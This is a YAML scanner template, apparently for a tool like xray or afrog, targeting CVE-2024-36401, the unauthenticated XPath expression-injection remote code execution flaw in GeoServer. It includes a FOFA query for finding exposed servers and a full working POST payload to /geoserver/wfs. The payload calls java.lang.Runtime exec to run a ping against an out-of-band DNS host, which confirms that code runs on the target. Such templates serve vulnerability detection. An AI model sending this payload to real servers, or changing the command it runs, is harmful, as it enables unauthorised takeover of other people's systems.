id: Geoserver-XPath-RCE-CVE-2024-36401
info:
  name: Geoserver XPath表达式注入致远程代码执行漏洞(CVE-2024-36401)
  author: Superhero
  severity: high
  description: |-
    fofa：app="GeoServer"
    2024年7月，互联网上披露Geoserver表达式注入致远程代码执行漏洞（CVE-2024-36401），攻击者无需认证即可利用该漏洞获取服务器权限，建议受影响的客户尽快修复漏洞。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140217074
  tags: RCE


set:
  oob: oob()
  oobDNS: oob.DNS


rules:
  r0:
    request:
      method: POST
      path: /geoserver/wfs
      headers:
        Content-Type: application/xml
      body: "
        <wfs:GetPropertyValue service='WFS' version='2.0.0'
          xmlns:topp='http://www.openplans.org/topp'
          xmlns:fes='http://www.opengis.net/fes/2.0'
          xmlns:wfs='http://www.opengis.net/wfs/2.0'>
            <wfs:Query typeNames='topp:states'/>
            <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'ping {{oobDNS}}')</wfs:valueReference>
        </wfs:GetPropertyValue> 
       "
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()




